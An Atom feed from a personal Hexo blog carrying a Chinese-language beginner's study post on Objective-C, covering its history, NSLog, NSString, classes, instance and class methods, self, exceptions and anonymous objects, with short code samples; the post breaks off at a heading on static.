<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zx的博客</title>
  
  <subtitle>This is from blue banister</subtitle>
  <link href="https://zengxiang21.github.io/atom.xml" rel="self"/>
  
  <link href="https://zengxiang21.github.io/"/>
  <updated>2022-04-28T13:50:36.059Z</updated>
  <id>https://zengxiang21.github.io/</id>
  
  <author>
    <name>zengxiang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Objective-C</title>
    <link href="https://zengxiang21.github.io/2022/03/24/objective-c/"/>
    <id>https://zengxiang21.github.io/2022/03/24/objective-c/</id>
    <published>2022-03-24T08:11:43.297Z</published>
    <updated>2022-04-28T13:50:36.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="objective-C概述"><a href="#objective-C概述" class="headerlink" title="objective-C概述"></a>objective-C概述</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>•Objective-C简称Obj-C或者OC</p><p>•C: C语言.</p><p>•Objective:面向对象的</p><p>•Objective-C: 面向对象的C语言.</p><p>–所以,OC的本质还是C语言.</p><p>–OC是在C的基础之上增加了一小部分的面向对象的语法.将C语言复杂的、繁琐的语法封装的更为简单.</p><p>–完全兼容C语言.也就是说在OC语言中可以写任意的C语言的代码.</p><h2 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h2><p>•20世纪80年代初期,Brad Cox结合C语言和Smalltalk的优势设计出了Objective-C语言.</p><p>•1985年,乔布斯创建NeXT公司,致力于设计经济实惠且功能强大的工作站,并选择Unix作为其工作站的操作系统.</p><p>•后来,NeXT公司设计出了NextStep – 使用OC语言编写的一套功能强大的界面工具包.</p><p>•1995年,NeXT公司获得OC的全部商业版权.</p><p>•1996年,苹果公司收购NeXT.NextStep得到了Mac开发人员的广泛认可.NextStep更名为Cocoa,从此OC成为开发Mac平台的主力语言.</p><p>•随着iPhone、iPad的火爆.OC又成为了iOS平台上的中流砥柱.</p><h2 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h2><p>•苹果在2014年的WWDC大会上正式推出Swift,在2015年的WWDC上宣布年底发布的Swift2.0将开源.Swift语言的优点:快速、现代、安全、互动且全面优于Objective-C语言.</p><p>•按照苹果的行事风格,Swift一定会取代OC成为iOS开发的主力语言.但是目前来看,要实现这一目标,还有一段路需要走.</p><p>–原因之一很多的企业在此之前他们已经使用Objective-C语言开发好了自己的程序.使用Swift重写是不可能的.</p><p>–原因之二是Swift刚刚发布,还有很多Bug没有完善,企业不愿意在小白鼠.</p><p>–原因之三在于Swift本身还没有成型.在后期发布的版本中有大量的变化甚至包括语法的变化.</p><p>•所以,Swift要想取代OC,个人分析至少需要2-3年.</p><p>•OC的光芒注定要被Swift的闪耀遮盖.</p><h2 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h2><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204161505669.png" alt="image-20220324201213460"></p><h1 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="oc基础"><a href="#oc基础" class="headerlink" title="oc基础"></a>oc基础</h1><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202203281733160.png" alt="image-20220328171229838"></p><p>•后缀名</p><p>–C程序的源文件的后缀名为.c</p><p>–OC程序的源文件的后缀名为.m</p><p>•m 代表message 代表OC中最重要的机制:消息机制.</p><p>•OC是完全兼容C语言的.</p><p>–在.m文件中可以写任意的C代码.</p><p>–.m文件中可以写OC代码、C代码、C++代码.</p><h3 id="import"><a href="#import" class="headerlink" title="#import"></a>#import</h3><ol><li>以#开头，预处理指令</li><li>作用：#include的增强版，将文件内容在预编译时候拷贝进写指令的地方</li><li>增强：同一个文件无论#inport多少次，只会包含一次(#include需要条件编译)</li></ol><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>•框架: 1个提供了功能类似的类和函数的集合.</p><p>–通俗的解释: 苹果或者第三方事先将一些牛X的功能写好.把这些功能模块封装在1个1个的类或者函数之中.供我们直接使用.这些类和函数的集合就叫做框架. 一个框架中提供的功能都是类似的.</p><p>–有点像C语言的函数库</p><p>–框架有很多: Foundation、AVFoundation、UIKit……</p><p>•Foundation框架</p><p>–提供了OC最基础的功能,数据类型的支持以及输入输出……</p><p>–其他的框架都是基于Foundation框架的</p><p>–Foundation.h 头文件引入了Foundation框架中的所有的头文件.</p><h3 id="NSlog"><a href="#NSlog" class="headerlink" title="NSlog"></a>NSlog</h3><p>•这是定义在Foundation框架中的函数.</p><p>•作用: 是printf函数的增强版.向控制台屏幕输出信息.</p><p>•语法: <strong>NSLog</strong><strong>(@”<strong><strong>格式控制字符串</strong></strong>”,<strong><strong>变量列表</strong></strong>);</strong></p><p>•增强的地方:</p><p>–自动换行,不需要手动加‘\n’在输出完信息后会自动换行.</p><p>–在输出信息的同时,还会输出其他的信息</p><p>•显示执行这句代码的时间.</p><p>•显示这句代码是由那1个程序来执行的.</p><p>•程序运行的时候,进程的ID PID</p><p>•线程ID</p><p>•最后面才是要输出的信息.</p><p>•NSLog函数支持使用格式控制符,来输出变量的值.格式控制符支持C语言的printf函数的格式控制符.并且用法也一致.</p><p>•特别注意</p><p>–NSLog函数的第1个参数,格式控制字符串的前面要加1个@符号.</p><p>–NSLog函数默认情况会在输出完信息后自动换行.如果我们手动的加了上’\n’换行符则自动换行失效.</p><h3 id="NSString"><a href="#NSString" class="headerlink" title="NSString"></a>NSString</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@interface NSString : NSObject &lt;NSCopying, NSMutableCopying, NSSecureCoding&gt;</span><br></pre></td></tr></table></figure><p>•C语言的字符串存储方式</p><p>–使用字符数组存储</p><p>–使用字符指针将字符串常量存储在数据段.</p><p>•OC中专门设计1个新的类型来保存字符串.无需关心其内部是如何实现的.</p><p>–NSString类型的指针变量.用来保存字符串的地址.</p><p>​    NSString *str=@”zx”</p><p>–OC中的字符串常量必须加1个前缀@符号.   @“jack”</p><p>–OC字符串常量与C字符串常量的区分</p><p>–NSString指针只能保存OC字符串地址,不能保存C字符串地址.</p><p>–使用%@输出OC字符串，%p为指针地址，%@为指针指向的值</p><p>–NSLog函数的第1个参数是NSString所以只能给1个OC字符串.</p><h4 id="c语言中字符指针和其他指针的区别"><a href="#c语言中字符指针和其他指针的区别" class="headerlink" title="c语言中字符指针和其他指针的区别"></a>c语言中字符指针和其他指针的区别</h4><p>其实呀，对于  char *p=”afjfkjkladfsjije”;  这句话中的指针着实很奇怪。</p><p>   当你  cout&lt;&lt;*p&lt;&lt;endl;  的时候，它输出的是那个字符串的首个字符——‘a’。</p><p>　　当你  cout&lt;&lt;p&lt;&lt;endl;   的时候，它输出的是整个字符串的内容——“”afjfkjkladfsjije””。</p><p>感觉到奇怪了吧，为什么这句话是输出整个字符串的内容，而不是地址呢。那么，我告诉你：没有为什么！</p><p>然而，经过高人指点了一下，发现是有原因的，什么原因呢？我也不太清楚，等明白了再告诉大家吧！下面补充上输出字符串指针地址的代码。</p><p>　　下面我就给出一段代码来验证我的说法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; p &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &amp;(p[<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &amp;p &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">h</span><br><span class="line">hello</span><br><span class="line">hello</span><br><span class="line">h</span><br><span class="line">0x7ffeb4aaf7d8</span><br></pre></td></tr></table></figure><h3 id="NS前缀"><a href="#NS前缀" class="headerlink" title="NS前缀"></a>NS前缀</h3><p>•NextStep -&gt; Cocoa 实际上是NeXT公司开发的.</p><p>•为了区分这些东西的前身是NeXT,就使用1个前缀NS</p><h3 id="符号"><a href="#符号" class="headerlink" title="@符号"></a>@符号</h3><p>•将C语言的字符串转换为OC字符串</p><p>“jack”-&gt;@”jack”</p><p>•OC中新增的关键字绝大部分以@符号开头</p><p>@autoreleasepool</p><h3 id="类的定义实现"><a href="#类的定义实现" class="headerlink" title="类的定义实现"></a>类的定义实现</h3><p>声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@interface 类名:NSObject&#123; </span><br><span class="line">// 类变量声明</span><br><span class="line">&#125;</span><br><span class="line">// 类属性声明</span><br><span class="line">// 类方法和声明</span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@implementation 类名</span><br><span class="line">// 类方法定义</span><br><span class="line">@end</span><br><span class="line">    </span><br><span class="line">类名-&gt;属性名</span><br><span class="line">*类名.属性名</span><br></pre></td></tr></table></figure><p>oc适用对象分为两个步骤：</p><p>1.Allocation(内存分配)   :为新的对象动态分配一段内存地址 </p><p>2.Initialization(初始化):为这段内存空间中填上合适的初始值</p><p> 只有这两个步骤都完成后,这个对象才能够真正的开始行使功能</p><p>创建对象的基本步骤</p><p>两个步骤在代码中是分别完成的 但是通常我们将它们合起来一次完成:</p><p>classname* anObject = [[Rectangle alloc] init];</p><p>将创建对象的两个步骤分开使得我们可以对这两步过 程分别进行控制内存分配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">类名 *对象名 = [类名 new];</span><br><span class="line">A *a = [A new];</span><br><span class="line">A *a = [[A alloc] init];</span><br></pre></td></tr></table></figure><p>概括来说，new和alloc/init在功能上几乎是一致的，分配内存并完成初始化。</p><p>差别在于，采用new的方式只能采用默认的init方法完成初始化，</p><p>采用alloc的方式可以用其他定制的初始化方法。</p><p>1、分配内存空间</p><p>a、使用alloc方法在堆区分配Person类的内存空间，存储创建的对象。</p><p>b、分配的内存空间的数据会被自动清空，即所有的实例变量的初始值为0。</p><p>c、返回分配的内存空间的地址。指针接收地址。</p><p>[Person alloc]在堆区创建对象，定义指针p1存储对象在堆区的内存空间地址。</p><p>Person * p1 = [Person alloc];</p><p>注：</p><p>OC中使用[ ]调用方法，方法和调用的对象层级对应。</p><p>如：[类类方法] [对象实例方法]</p><p>类中属性默认protected</p><p>加@public</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- (return_type) method_name:( argumentType1 )argumentName1 </span><br><span class="line">joiningArgument2:( argumentType2 )argumentName2 ... </span><br><span class="line">joiningArgumentn:( argumentTypen )argumentNamen &#123;</span><br><span class="line">   body of the function</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h4><ul><li>对象方法以-开头，如 -(void)xx；</li><li>对象方法只能由对象来调用；</li><li>对象方法中可以访问当前对象的成员变量；</li><li>调用格式 [对象名 对象方法名]。</li></ul><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204151447617.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//声明没有返回值的方法</span><br><span class="line">- (void)method;</span><br><span class="line">//声明有返回值的方法</span><br><span class="line">- (int)method;</span><br><span class="line">//声明有返回值有参数的方法</span><br><span class="line">- (int)method: (int)var;</span><br><span class="line">//声明有返回值有多个参数的方法</span><br><span class="line">- (int)method: (int)var1 andVar2: (int)var2;</span><br></pre></td></tr></table></figure><h4 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h4><p><a href="http://lib.csdn.net/base/objective-c">Objective-C</a>里面既有实例方法也类方法。类方法(Class Method) 有时被称为工厂方法(Factory Method)或者方便方法(Convenience  method)。工厂方法的称谓明显和一般意义上的工厂方法不同，从本质上来说，类方法可以独立于对象而执行，所以在其他的语言里面类方法有的时候被称为静态方法。</p><p>以+开头的方法是类方法。</p><p>它是属于类本身的方法，不属于类的某一个实例对象，不需要实例化类，用类名即可使用，通过类方法将消息发送给类。</p><ul><li><p>类方法以+开头，如+(void)put；</p></li><li><p>类方法只能由类来调用；</p></li><li><p>类方法中不能直接访问实例(成员)变量，因为类方法由类来调用，并没有创建存储空间来存储类中的成员变量。</p></li><li><p>注意点一：类方法<br> 1，类方法可以调用类方法。<br> 2，类方法不可以调用实例方法，但是类方法可以通过创建对象来访问实例方法。<br> 3，类方法不可以使用实例变量。类方法可以使用self，因为self不是实例变量。<br> 4，类方法作为消息，可以被发送到类或者对象里面去（实际上，就是可以通过类或者对象调用类方法的意思）。</p></li><li><p>注意点二：self的规则(相当于this指针)</p><p>self：自己的；和Java、C#中的this关键字有些类似<br> 可以在对象方法和类方法中使用，self是一个指针，在对象方法中self指向当前对象，在类方法中self指向当前对象，在类方法中self指向当前类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在对象方法利用&quot;self-&gt;成员变量名&quot;访问当前对象内部的成员变量</span><br><span class="line">[self 方法名]可以调用其他对象方法\类方法</span><br></pre></td></tr></table></figure><p>大家需要记住下面的规则：</p><p> （1）谁调用了当前方法，self就代表谁</p><p> * self出现在对象方法中，self就代表对象</p><p> * self出现在类方法中，self就代表类</p><p> 1，实例方法里面的self，是对象的首地址。<br> 2，类方法里面的self，是Class.<br> 尽管在同一个类里面的使用self，但是self却有着不同的解读。在类方法里面的self，可以翻译成class  self；在实例方法里面的self，应该被翻译成为object  self。在类方法里面的self和实例方法里面的self有着本质上的不同，尽管他们的名字都叫self。</p><p> 类方法创造的对象要不要用release释放？<br> 答 不需要 这个对象被放到自动释放池中</p><p> Object-C中的私有方法和私有成员变量</p><p> 成员变量默认对内是共有的，对外是私有的</p></li></ul><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明没有返回值的类方法</span></span><br><span class="line">+ (<span class="keyword">void</span>)method;</span><br><span class="line"><span class="comment">//声明有返回值的类方法</span></span><br><span class="line">+ (<span class="keyword">int</span>)method;</span><br><span class="line"><span class="comment">//声明有返回值有参数的类方法</span></span><br><span class="line">+ (<span class="keyword">int</span>)method: (<span class="keyword">int</span>)var;</span><br><span class="line"><span class="comment">//声明有返回值有多个参数的类方法</span></span><br><span class="line">+ (<span class="keyword">int</span>)method: (<span class="keyword">int</span>)var1 andVar2: (<span class="keyword">int</span>)var2;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204151449444.png" alt="image-20220415144952467"></p><h4 id="对象方法声明和实现"><a href="#对象方法声明和实现" class="headerlink" title="对象方法声明和实现"></a>对象方法声明和实现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">//  main.m</span><br><span class="line">//  ClassDemo 类</span><br><span class="line">//</span><br><span class="line">//  Created by ZhaiKun on 2017/10/9.</span><br><span class="line">//  Copyright © 2017年 ZhaiKun. All rights reserved.</span><br><span class="line">//</span><br><span class="line"> </span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line"> 类：具有相同特征和行为的对象的集合</span><br><span class="line"> 对象：个人的理解是 万物皆对象</span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line">//类的声明</span><br><span class="line">//Person 类名 首字母大写</span><br><span class="line">@interface Person : NSObject</span><br><span class="line">&#123;</span><br><span class="line">    //类的属性定义在 &#123; &#125; 中</span><br><span class="line">@public</span><br><span class="line">    NSString *name;</span><br><span class="line">    int age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//方法的声明</span><br><span class="line">- (void)noParamMethod;//声明一个 返回值为空void 无参数 名为noParamMethod的方法</span><br><span class="line"> </span><br><span class="line">//带有一个参数的方法</span><br><span class="line">- (void)oneParamMethod:(NSString *)nameParam;//声明一个 返回值为空void 参数类型为NSString * 参数名为nameParam名为oneParamMethod的方法</span><br><span class="line"> </span><br><span class="line">//带多个参数的方法</span><br><span class="line">- (void)paramsMethod:(int)age1 :(int)age2;</span><br><span class="line"> </span><br><span class="line">//在类方法的实现中，可以直接访问类的属性</span><br><span class="line">- (int)classSelfParamMethod;</span><br><span class="line">@end</span><br><span class="line"> </span><br><span class="line">//类的实现</span><br><span class="line">@implementation Person</span><br><span class="line">//方法的实现</span><br><span class="line">- (void)noParamMethod&#123;</span><br><span class="line">    NSLog(@&quot;noParamMethod方法的实现&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">- (void)oneParamMethod:(NSString *)nameParam&#123;</span><br><span class="line">    nameParam = @&quot;带有一个参数的方法&quot;;</span><br><span class="line">    NSLog(@&quot;%@&quot;, nameParam);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">- (void)paramsMethod:(int)age1 :(int)age2&#123;</span><br><span class="line">    NSLog(@&quot;多个参数的方法：%d&quot;, age1+age2);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">- (int)classSelfParamMethod&#123;</span><br><span class="line">    age = 18;</span><br><span class="line">    return age;</span><br><span class="line">&#125;</span><br><span class="line">@end</span><br><span class="line"> </span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line">    @autoreleasepool &#123;</span><br><span class="line">        Person *person = [Person new];//类的一个实例对象，类的每一个对象是各不相同的，类中的属性和方法必须通过类的实例对象进行调用</span><br><span class="line">        //person-&gt;name = @&quot;类属性的调用&quot;;</span><br><span class="line">        (*person).name = @&quot;类属性的另一种调用方式&quot;;</span><br><span class="line">        NSLog(@&quot;%@&quot;, person-&gt;name);</span><br><span class="line">        </span><br><span class="line">        //方法的调用</span><br><span class="line">        [person noParamMethod];</span><br><span class="line">        [person oneParamMethod:@&quot;&quot;];</span><br><span class="line">        [person paramsMethod:1 :2];</span><br><span class="line">        NSLog(@&quot;在方法中直接调用类的属性：%d&quot;, [person classSelfParamMethod]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204151630180.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204151645349.png" alt="image-20220415164545389"></p><p>isa指针指向代码段，对象空间只有属性，方法在代码段(方法代码一样，保存一份就行)</p><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204151656770.png" alt="image-20220415165636766"></p><p>方法返回值为当前类对象，携程instancetype</p><h4 id="对象属性默认值"><a href="#对象属性默认值" class="headerlink" title="对象属性默认值"></a>对象属性默认值</h4><p>基本数据类型为0</p><p>oc指针为nil</p><p>c指针为NULL</p><p>在objective-c中定义多个类之后，会难以找到类的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#pragma mark o#pragma mark -</span><br></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@try &#123;</span><br><span class="line">//可能发生异常的代码,异常后面的代码直接掠过跳到catch中</span><br><span class="line">&#125; </span><br><span class="line">@catch (NSException *exception) &#123;</span><br><span class="line">    //发生异常执行的代码</span><br><span class="line">&#125;</span><br><span class="line">@finally&#123;&#125;</span><br><span class="line">//c语言异常无法处理</span><br></pre></td></tr></table></figure><p>NsException对象常用属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name : 用于唯一地识别异常的短字符串。名称是必需的</span><br><span class="line">reason:一个更长的包含造成异常原因的“人类可读的”字符串。原因是必需的。</span><br><span class="line">userInfo：主要当异常被抛出时，返回原因等信息的一个字典。</span><br></pre></td></tr></table></figure><h4 id="打印指针"><a href="#打印指针" class="headerlink" title="打印指针"></a>打印指针</h4><p>我们知道c语言中对于指针的操作是可以直接通过打印指针而得到对象的地址的，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *s = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;s的值：%s&quot;</span>,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;s的地址：%p&quot;</span>,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;首字符为：%c&quot;</span>,*s);</span><br><span class="line"></span><br><span class="line">s的值：abc</span><br><span class="line">s的地址：<span class="number">0x107f3ced8</span></span><br><span class="line">首字符为：a</span><br></pre></td></tr></table></figure><p>如此我们联想oc当中的字符串NSString，现在我们用oc的方式初始化一个字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NSString *str = @&quot;abc&quot;;</span><br><span class="line">NSLog(&quot;str的值为：%@&quot;,str);</span><br><span class="line">NSLog(&quot;str的地址为：%p&quot;,str);</span><br><span class="line"></span><br><span class="line">str的值为：abc</span><br><span class="line">str的地址为：0x1027510c8 </span><br></pre></td></tr></table></figure><p>其实NSString本身是一个对象，它不同于char *这些基本类型。本质上OC的对象是一个结构体。<br> NSLog在打印%@格式的对象时，会直接调用对象的description方法。与基本数据类型的处理是有区别的。所以oc的%@也并不是意味着值的打印，它代表的是打印对象。</p><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204161502423.png" alt="NewImage"></p><p>create  groups 会参加编译(黄色文件夹)，create file reference不会参加编译(蓝色文件夹)</p><h3 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h3><p>匿名对象只能用一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;Iphone.h&quot;</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line"></span><br><span class="line">    //1.通过指针访问对象</span><br><span class="line">    Iphone *ip =  [Iphone new];     // 创建一个对象，并用指针ip接收</span><br><span class="line">    ip-&gt;_size = 4.3;  //这种是指针访问结构体成员变量的专用写法。OC的对象都是指针，存储着堆中的一块内存地址。              </span><br><span class="line">    ip.weight = 10;        // 通过点语法来访问对象的成员变量</span><br><span class="line">    [ip powerOff];      // 通过指针来访问对象的方法</span><br><span class="line">    </span><br><span class="line">    //2. 匿名对象，无指针</span><br><span class="line">    [Iphone new]; // 这里创建了一个对象，但是这个对象并没有用指针来接收，这个对象就是匿名对象</span><br><span class="line">    </span><br><span class="line">     注意：每次创建一个匿名对象，都会给这个对象分配不同的存储空间，也就是说每个匿名对象都不相同。</span><br><span class="line">     //3.没有两个相同的匿名对象</span><br><span class="line">    [Iphone new]-&gt;_cpu = 5;   // 给第1个匿名对象_cpu赋值</span><br><span class="line">    [Iphone new]-&gt;_size = 4.0; //给第2个匿名对象_size赋值</span><br><span class="line">    [Iphone new]-&gt;_weight = 15; //给第3个匿名对象_weight赋值</span><br><span class="line">    [[Iphone new] powerOff];  //调用第4个匿名对象powerOff方法</span><br><span class="line">    NSLog(@&quot;%@&quot;,[Iphone new]); //打印第5个匿名对象</span><br><span class="line"></span><br><span class="line">     //猜猜看，这里打印的结果全为0。</span><br><span class="line">     //原因是每次赋值时，都创建了新的匿名对象，NSLog打印的是一个新的匿名对象，它的成员变量并没有赋值。所以都为0。</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">   //4. 匿名对象可以作为实参进行传递</span><br><span class="line">    Person *p = [Person new];</span><br><span class="line">    Iphone *ip = [Iphone new];</span><br><span class="line">    [p sendSignal:ip];    //这里是通过指针，作为实参传递</span><br><span class="line">  </span><br><span class="line">    [p sendSignal:[Iphone new]];//这里是使用匿名对象，作为实参传递，但是[Iphone new]对象在这次使用之后就会被销毁，除非有新的指针引用它。</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="static"><a href="#static" class="headerlink" 